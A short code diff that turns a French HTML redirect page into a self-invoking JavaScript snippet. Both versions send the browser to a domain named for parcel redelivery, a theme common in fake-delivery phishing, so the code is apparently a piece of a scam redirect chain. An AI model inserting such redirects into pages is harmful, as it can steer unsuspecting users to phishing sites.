@@ -1,14 +1,7 @@
-<!DOCTYPE html>
-<html lang="fr">
-<head>
-  <meta charset="UTF-8">
-  <title>Redirection...</title>
-</head>
-<body>
-  <p>Redirection en cours...</p>
+(function () {
+  const target = "https://colis-relivraison.com";
 
-  <script>
-    window.location.href = "https://colis-relivraison.com";
-  </script>
-</body>
-</html>
+  if (window.location.href !== target) {
+    window.location.replace(target);
+  }
+})();
